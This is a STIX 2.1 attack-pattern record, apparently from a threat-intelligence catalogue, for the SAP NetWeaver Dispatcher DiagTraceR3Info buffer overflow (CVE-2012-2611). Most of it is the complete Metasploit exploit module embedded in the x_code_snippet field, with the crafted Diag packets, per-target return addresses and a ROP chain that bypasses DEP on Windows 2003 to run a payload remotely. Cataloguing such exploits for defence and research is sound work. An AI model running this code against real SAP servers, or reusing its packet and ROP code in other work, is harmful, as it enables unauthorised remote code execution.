{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--62d01f06-6cf1-48e1-a87d-3e28c61df16e",
    "created": "2024-08-14T16:46:37.184366Z",
    "modified": "2024-08-14T16:46:37.18437Z",
    "name": "SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the SAP NetWeaver Dispatcher service. The overflow occurs in the DiagTraceR3Info() function and allows a remote attacker to execute arbitrary code by supplying a special crafted Diag packet. The Dispatcher service is only vulnerable if the Developer Traces have been configured at levels 2 or 3. The module has been successfully tested on SAP Netweaver 7.0 EHP2 SP6 over Windows XP SP3 and Windows 2003 SP2 (DEP bypass). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/sap_netweaver_dispatcher.rb",
            "external_id": "sap_netweaver_dispatcher.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2611"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/sap-netweaver-dispatcher-multiple-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=Uncovering_SAP_vulnerabilities_reversing_and_breaking_the_Diag_protocol"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the SAP NetWeaver Dispatcher\n        service. The overflow occurs in the DiagTraceR3Info() function and allows a remote\n        attacker to execute arbitrary code by supplying a special crafted Diag packet. The\n        Dispatcher service is only vulnerable if the Developer Traces have been configured\n        at levels 2 or 3. The module has been successfully tested on SAP Netweaver 7.0 EHP2\n        SP6 over Windows XP SP3 and Windows 2003 SP2 (DEP bypass).\n      },\n      'Author'      => [\n        'Martin Gallo', # Vulnerability discovery and PoC\n        'juan vazquez' # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'OSVDB', '81759' ],\n          [ 'CVE', '2012-2611' ],\n          [ 'BID', '53424' ],\n          [ 'EDB', '20705' ],\n          [ 'URL', 'http://www.coresecurity.com/content/sap-netweaver-dispatcher-multiple-vulnerabilities'],\n          [ 'URL', 'http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=Uncovering_SAP_vulnerabilities_reversing_and_breaking_the_Diag_protocol']\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 4000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # disp+work.exe version 7200.70.18.23869\n          [\n            'SAP Netweaver 7.0 EHP2 SP6 / Windows XP SP3',\n            {\n              'Ret' => 0x5f7a # 0x005f007a # call ebx from disp+work.EXE\n            }\n          ],\n          [\n            'SAP Netweaver 7.0 EHP2 SP6 / Windows 2003 SP2',\n            {\n              'Ret' => 0x77bde7f6 # {pivot 44} # ADD ESP,2C # RETN from msvcrt.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2012-05-08'))\n\n      register_options([Opt::RPORT(3200)])\n\n  end\n\n  def create_rop_chain()\n    # ROP chains provided by Corelan.be\n    # https://www.corelan.be/index.php/security/corelan-ropdb/#msvcrtdll_8211_v7037903959_Windows_2003_SP1_SP2\n    rop_gadgets =\n      [\n        0x77bb2563, # POP EAX # RETN\n        0x77ba1114, # <- *&VirtualProtect()\n        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n        0x41414141, #junk\n        0x77bb0c86, # XCHG EAX,ESI # RETN\n        0x77bc9801, # POP EBP # RETN\n        0x77be2265, # ptr to 'push esp #  ret'\n        0x77bb2563, # POP EAX # RETN\n        0x03C0A40F,\n        0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n        0x77bb48d3, # POP EBX, RET\n        0x77bf21e0, # .data\n        0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n        0x77bbfc02, # POP ECX # RETN\n        0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n        0x77bd8c04, # POP EDI # RETN\n        0x77bd8c05, # ROP NOP (-> edi)\n        0x77bb2563, # POP EAX # RETN\n        0x03c0984f,\n        0x77bdd441, # SUB EAX, 03c0940f\n        0x77bb8285, # XCHG EAX,EDX # RETN\n        0x77bb2563, # POP EAX # RETN\n        0x90909090,#nop\n        0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n      ].pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    connect\n\n    # initialize\n    diagheader = \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\"\n    user_connect = \"\\x10\\x04\\x02\\x00\\x0c\\x00\\x00\\x00\\xc8\\x00\\x00\\x04\\x4c\\x00\\x00\\x0b\\xb8\"\n    support_data = \"\\x10\\x04\\x0b\\x00\\x20\"\n    support_data << \"\\xff\\x7f\\xfa\\x0d\\x78\\xb7\\x37\\xde\\xf6\\x19\\x6e\\x93\\x25\\xbf\\x15\\x93\"\n    support_data << \"\\xef\\x73\\xfe\\xeb\\xdb\\x51\\xed\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    dpheader = \"\\xff\\xff\\xff\\xff\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\"\n    dpheader << \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\n    dpheader << [diagheader.length + user_connect.length + support_data.length].pack(\"V\")\n    dpheader << \"\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\"\n    dpheader << \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\"\n    dpheader << \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\"\n    dpheader << \"terminalXXXXXXX\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x20\\x20\\x20\\x20\\x20\"\n    dpheader << \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x00\\x00\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x01\\x00\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    dpheader << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt = [dpheader.length + diagheader.length + user_connect.length + support_data.length].pack(\"N\")\n    pkt << dpheader\n    pkt << diagheader\n    pkt << user_connect\n    pkt << support_data\n    print_status(\"Sending initialize packet to the SAP Dispatcher\")\n    sock.put(pkt)\n    res = sock.get_once(-1)\n\n    if not res\n      print_error(\"The connection with the Dispatcher has not been initialized\")\n      return\n    end\n\n    # send message\n    if target.name =~ /Windows XP SP3/\n      crash = make_nops(112)\n      crash << \"\\xeb\\x02\" # jmp over call pointer\n      crash << [target.ret].pack(\"v\")\n      crash << make_nops(10) * 200\n      crash << payload.encoded\n    else # Windows 2003\n      crash = \"C\\x00\" # Avoid \"UNICODE\" conversion when copying data to stack\n      crash << rand_text(2) # padding\n      crash << [0x77bd7d82].pack(\"V\") * 55  # <== after stackpivoting esp points here # \"ret\" ROP nop from msvcrt\n      crash << [0x77bdf0da].pack(\"V\")  # pop eax # ret from msvcrt\n      crash << [target.ret].pack(\"V\") # stackpivot\n      crash << create_rop_chain\n      crash << payload.encoded\n    end\n\n    print_status(\"Sending crafted message\")\n    message = \"\\x10\\x06\\x20\" + [crash.length].pack(\"n\") + crash\n    diagheader = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    step = \"\\x10\\x04\\x26\\x00\\x04\\x00\\x00\\x00\\x01\"\n    eom = \"\\x0c\"\n    pkt = [diagheader.length + step.length + message.length + eom.length].pack(\"N\")\n    pkt << diagheader\n    pkt << step\n    pkt << message\n    pkt << eom\n    sock.put(pkt)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-08",
    "x_mitre_platforms": [
        "win'"
    ]
}